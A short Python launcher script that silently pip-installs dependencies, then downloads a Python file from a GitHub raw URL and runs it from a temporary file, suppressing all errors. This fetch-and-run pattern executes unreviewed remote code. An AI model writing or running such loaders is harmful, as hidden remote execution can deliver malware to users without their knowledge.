import urllib.request
import tempfile
import os
import subprocess
import sys

RAW_URL = "https://raw.githubusercontent.com/JackPyDev/Jack-Encryption/main/Jack_Enc.py"

DEPS = ["jaack==1.0.11", "Cython", "rich", "pyfiglet"]


def ensure_deps():
    for pkg in DEPS:
        name = pkg.split("==")[0].split(">=")[0].strip()
        import_name = {"Cython": "Cython", "pyfiglet": "pyfiglet", "rich": "rich", "jaack": "jaack"}.get(name, name)
        try:
            __import__(import_name)
        except ImportError:
            r = subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg], capture_output=True, text=True)
            if r.returncode != 0:
                sys.exit(1)


def fetch_code(url):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.read().decode("utf-8")


def run_in_temp(code):
    original_cwd = os.getcwd()
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8") as f:
        f.write(code)
        tmp_path = f.name
    try:
        subprocess.run([sys.executable, tmp_path], cwd=original_cwd)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


def main():
    ensure_deps()
    code = fetch_code(RAW_URL)
    run_in_temp(code)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception:
        pass